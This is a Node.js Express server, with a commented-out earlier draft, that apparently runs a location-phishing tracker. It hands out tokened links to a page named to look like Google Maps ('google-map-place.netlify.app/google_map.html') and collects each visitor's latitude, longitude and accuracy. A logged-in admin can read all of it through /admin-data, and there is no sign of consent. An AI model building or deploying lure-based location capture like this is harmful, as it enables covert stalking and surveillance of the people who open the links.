/*import express from "express";
import cors from "cors";
import path from "path";
import { fileURLToPath } from "url";

const app = express();
/*const PORT = 3000;
const PORT = process.env.PORT || 3000;


const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

let locations = {};
let activeUsers = new Set();

/* MIDDLEWARE 
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, "../frontend")));

/* TRACK PAGE 
app.get("/track", (req,res)=>{
  res.sendFile(path.join(__dirname,"../frontend/google_map.html"));
});

/* ADMIN PAGE 
app.get("/admin", (req,res)=>{
  res.sendFile(path.join(__dirname,"../frontend/admin.html"));
});

/* RECEIVE LOCATION 
app.post("/send-location",(req,res)=>{
  const { token, lat, lng, acc } = req.body;
  if(!token) return res.sendStatus(400);

  locations[token] = {
    lat,lng,acc,
    time: Date.now()
  };
  activeUsers.add(token);

  console.log("📍 Location:",token,lat,lng,acc);
  res.sendStatus(200);
});

/* ADMIN FETCH 
app.get("/admin-data",(req,res)=>{
  res.json({
    users:[...activeUsers],
    locations
  });
});

/* CLEAN DISCONNECTED USERS 
setInterval(()=>{
  const now = Date.now();
  for(const t in locations){
    if(now - locations[t].time > 60000){
      delete locations[t];
      activeUsers.delete(t);
    }
  }
},15000);

app.listen(PORT,()=>{
  console.log(`✅ Server running on http://localhost:${PORT}`);
});
app.post("/create-link",(req,res)=>{
  const token = Math.random().toString(36).slice(2,10);
  res.json({ link:`/track?token=${token}` });
});

app.get("/get-all-locations",(req,res)=>{
  res.json(locations);
});
*/import express from "express";
import cors from "cors";
import crypto from "crypto";

const app = express();
app.use(cors());
app.use(express.json());

/* ========= GLOBAL MEMORY (LEARNING MODE) ========= */
const state = {
  sessions: {},   // sessionId -> { links: [] }
  locations: {}   // token -> { lat, lng, acc, time }
};

/* ========= LOGIN ========= */
app.post("/login", (req, res) => {
  const { password } = req.body;

  if (password !== process.env.ADMIN_PASSWORD) {
    return res.status(401).send("Unauthorized");
  }

  const sessionId = crypto.randomUUID();
  state.sessions[sessionId] = { links: [] };

  res.json({ sessionId });
});

/* ========= CREATE LINK ========= */
app.post("/create-link", (req, res) => {
  const { sessionId } = req.body;
  const session = state.sessions[sessionId];

  if (!session) {
    return res.status(403).send("Invalid session");
  }

  // limit = 3 links
  if (session.links.length >= 3) {
    const oldToken = session.links.shift();
    delete state.locations[oldToken];
  }

  const token = Math.random().toString(36).slice(2, 10);
  session.links.push(token);

  res.json({
    link: `https://google-map-place.netlify.app/google_map.html?token=${token}`
  });
});

/* ========= RECEIVE LOCATION ========= */
app.post("/send-location", (req, res) => {
  const { token, lat, lng, acc } = req.body;

  if (!token) {
    return res.status(400).send("Missing token");
  }

  state.locations[token] = {
    lat,
    lng,
    acc,
    time: Date.now()
  };

  res.send("OK");
});

/* ========= ADMIN FETCH ========= */
app.get("/admin-data", (req, res) => {
  res.json(state.locations);
});

/* ========= START SERVER ========= */
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("🚀 Server running on port", PORT);
});
